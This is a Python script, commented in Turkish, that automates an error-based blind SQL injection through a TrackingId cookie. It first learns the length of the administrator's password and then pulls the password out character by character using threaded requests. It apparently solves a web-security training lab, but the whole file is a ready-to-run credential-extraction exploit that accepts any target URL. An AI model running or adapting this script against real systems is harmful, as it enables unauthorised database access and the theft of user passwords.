import requests
import concurrent.futures

url = input("URL: ")
track = input("Tracking ID: ")
sess = input("Session ID: ")
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Hata kontrol fonksiyonu
def pass_tespit(payload):
    cookies = {'TrackingId': payload, 'session': sess}
    response = requests.get(url, cookies=cookies)
    print(f"Payload: {payload} | Status Code: {response.status_code}")
    return response.status_code == 500  # 500 hata kodunu kontrol edin

# Şifrenin uzunluğunu bulmak için fonksiyon
def uzun_tespit(payload):
    cookies = {'TrackingId': payload, 'session': sess}
    response = requests.get(url, cookies=cookies)
    print(f"Payload: {payload} | Status Code: {response.status_code}")
    return response.status_code == 200  # 200 hata kodunu kontrol edin

def uzun_bul():
    for uz in range(1, 100):  # 1'den 20'ye kadar deneme
        payload = f"{track}'||(SELECT CASE WHEN LENGTH(password)>{uz} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        print(f"Denenen Uzunluk: {uz}")
        if uzun_tespit(payload):
            print(f"Şifre uzunluğu: {uz}")
            return uz
    return None

# Şifreyi bulmak için fonksiyon
def char_bul(position):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_char = {executor.submit(pass_tespit, f"{track}'||(SELECT "
                                                       f"CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) "
                                                       f"ELSE '' END FROM users WHERE username='administrator')||'"):
                              char for char in chars}
        for future in concurrent.futures.as_completed(future_to_char):
            char = future_to_char[future]
            try:
                if future.result():
                    print(f"{position}. pozisyonda bulunan karakter: {char}")
                    return char
            except Exception as exc:
                print(f"{char} için bir hata oluştu: {exc}")
    return None

def pass_bul(passuz):
    password = ''
    for i in range(1, passuz + 1):
        char = char_bul(i)
        if char:
            password += char
            print(f"Şu ana kadar bulunan şifre: {password}")
        else:
            print(f"{i} pozisyonunda karakter yok")
            break
    return password

# Şifrenin uzunluğunu bul
passuz = uzun_bul()
if passuz:
    print(f"Şifre uzunluğu bulundu: {passuz}")

    # Şifreyi bul
    password = pass_bul(passuz)
    print(f"Şifre bulundu: {password}")
else:
    print("Şifre uzunluğu bulunamadı.")